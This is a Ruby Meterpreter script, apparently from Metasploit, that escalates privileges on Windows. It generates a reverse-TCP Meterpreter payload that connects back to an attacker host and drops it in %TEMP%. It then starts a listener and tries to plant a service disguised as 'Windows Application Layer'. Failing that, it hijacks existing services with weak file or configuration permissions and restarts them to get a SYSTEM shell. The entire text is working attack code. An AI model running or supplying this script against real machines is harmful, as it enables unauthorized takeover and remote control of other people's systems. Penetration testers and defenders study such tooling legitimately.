##
# Many services are configured with insecure permissions. This
# script attempts to create a service, then searches through a list of
# existing services to look for insecure file or configuration
# permissions that will let it replace the executable with a payload.
# It will then attempt to restart the replaced service to run the
# payload. If that fails, the next time the service is started (such as
# on reboot) the attacker will gain elevated privileges.
#
# scriptjunkie   googlemail   com
#
##

if client.platform !~ /win32/
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-a"  => [ false,  "Aggressive mode - exploit as many services as possible (can be dangerous!)"],
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
)

#
# Default parameters
#

rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
aggressive = false

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-a"
		aggressive = true
	when "-h"
		print_status("Generic weak service permissions privilege escalation.")
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	end
end

# Get the exe payload.
pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
raw  = pay.generate
exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
#and placing it on the target in %TEMP%
tempdir = client.fs.file.expand_path("%TEMP%")
tempexename = Rex::Text.rand_text_alpha((rand(8)+6))
tempexe = tempdir + "\\" + tempexename + ".exe"
print_status("Preparing connect back payload to host #{rhost} and port #{rport} at #{tempexe}")
fd = client.fs.file.new(tempexe, "wb")
fd.write(exe)
fd.close

#get handler to be ready
handler = client.framework.exploits.create("multi/handler")
handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
handler.datastore['LHOST']   = rhost
handler.datastore['LPORT']   = rport
handler.datastore['InitialAutoRunScript'] = "migrate -f"
handler.datastore['ExitOnSession'] = false
#start a handler to be ready
handler.exploit_simple(
	'Payload'	=> handler.datastore['PAYLOAD'],
	'RunAsJob'       => true
)

#attempt to make new service
client.railgun.kernel32.LoadLibraryA("advapi32.dll")
client.railgun.get_dll('advapi32')
client.railgun.add_function( 'advapi32', 'DeleteService','BOOL',[
	[ "DWORD", "hService", "in" ]
])

#SERVICE_NO_CHANGE 0xffffffff for DWORDS or NULL for pointer values leaves the current config

print_status("Trying to add a new service...")
adv = client.railgun.advapi32
manag = adv.OpenSCManagerA(nil,nil,0x10013)
if(manag["return"] != 0)
	# SC_MANAGER_CREATE_SERVICE = 0x0002
	newservice = adv.CreateServiceA(manag["return"],"walservice","Windows Application Layer",0x0010,0X00000010,2,0,tempexe,nil,nil,nil,nil,nil)
	#SERVICE_START=0x0010  SERVICE_WIN32_OWN_PROCESS= 0X00000010
	#SERVICE_AUTO_START = 2 SERVICE_ERROR_IGNORE = 0
	if(newservice["return"] != 0)
		print_status("Created service... #{newservice["return"]}")
		ret = adv.StartServiceA(newservice["return"], 0, nil)
		print_status("Service should be started! Enjoy your new SYSTEM meterpreter session.")
		service_delete("walservice")
		adv.CloseServiceHandle(newservice["return"])
		if aggressive == false
			adv.CloseServiceHandle(manag["return"])
			raise Rex::Script::Completed
		end
	else
		print_status("Uhoh. service creation failed, but we should have the permissions. :-(")
	end
else
	print_status("No privs to create a service...")
	manag = adv.OpenSCManagerA(nil,nil,1)
	if(manag["return"] == 0)
		print_status("Cannot open sc manager. You must have no privs at all. Ridiculous.")
	end
end
print_status("Trying to find weak permissions in existing services..")
#Search through list of services to find weak permissions, whether file or config
serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
#for each service
service_list.each do |serv|
	begin
		srvtype = registry_getvaldata("#{serviceskey}\\#{serv}","Type").to_s
		if srvtype != "16"
			continue
		end
		moved = false
		configed = false
		#default path, but there should be an ImagePath registry key
		source = client.fs.file.expand_path("%SYSTEMROOT%\\system32\\#{serv}.exe")
		#get path to exe; parse out quotes and arguments
		sourceorig = registry_getvaldata("#{serviceskey}\\#{serv}","ImagePath").to_s
		sourcemaybe = client.fs.file.expand_path(sourceorig)
		if( sourcemaybe[0] == '"' )
			sourcemaybe = sourcemaybe.split('"')[1]
		else
			sourcemaybe = sourcemaybe.split(' ')[0]
		end
		begin
			client.fs.file.stat(sourcemaybe) #check if it really exists
			source = sourcemaybe
		rescue
			print_status("Cannot reliably determine path for #{serv} executable. Trying #{source}")
		end
		#try to exploit weak file permissions
		if(source != tempexe && client.railgun.kernel32.MoveFileA(source, source+'.bak')["return"])
			client.railgun.kernel32.CopyFileA(tempexe, source, false)
			print_status("#{serv} has weak file permissions - #{source} moved to #{source + '.bak'} and replaced.")
			moved = true
		end
		#try to exploit weak config permissions
		#open with SERVICE_CHANGE_CONFIG (0x0002)
		servhandleret = adv.OpenServiceA(manag["return"],serv,2)
		if(servhandleret["return"] != 0)
			#SERVICE_NO_CHANGE is  0xFFFFFFFF
			if(adv.ChangeServiceConfigA(servhandleret["return"],0xFFFFFFFF,0xFFFFFFFF,0xFFFFFFFF,tempexe,nil,nil,nil,nil,nil,nil))
				print_status("#{serv} has weak configuration permissions - reconfigured to use exe #{tempexe}.")
				configed = true
			end
			adv.CloseServiceHandle(servhandleret["return"])

		end
		if(moved != true && configed != true)
			print_status("No exploitable weak permissions found on #{serv}")
			continue
		end
		print_status("Restarting #{serv}")
		#open with  SERVICE_START (0x0010) and SERVICE_STOP (0x0020)
		servhandleret = adv.OpenServiceA(manag["return"],serv,0x30)
		if(servhandleret["return"] != 0)
			#SERVICE_CONTROL_STOP = 0x00000001
			if(adv.ControlService(servhandleret["return"],1,56))
				client.railgun.kernel32.Sleep(1000)
				adv.StartServiceA(servhandleret["return"],0,nil)
				print_status("#{serv} restarted. You should get a system meterpreter soon. Enjoy.")
				#Cleanup
				if moved == true
					client.railgun.kernel32.MoveFileExA(source+'.bak', source, 1)
				end
				if configed == true
					servhandleret = adv.OpenServiceA(manag["return"],serv,2)
					adv.ChangeServiceConfigA(servhandleret["return"],0xFFFFFFFF,0xFFFFFFFF,0xFFFFFFFF,sourceorig,nil,nil,nil,nil,nil,nil)
					adv.CloseServiceHandle(servhandleret["return"])
				end
				if aggressive == false
					raise Rex::Script::Completed
				end
			else
				print_status("Could not restart #{serv}. Wait for a reboot. (or force one yourself)")
			end
			adv.CloseServiceHandle(servhandleret["return"])
		else
			print_status("Could not restart #{serv}. Wait for a reboot. (or force one yourself)")
		end
	rescue
	end
end

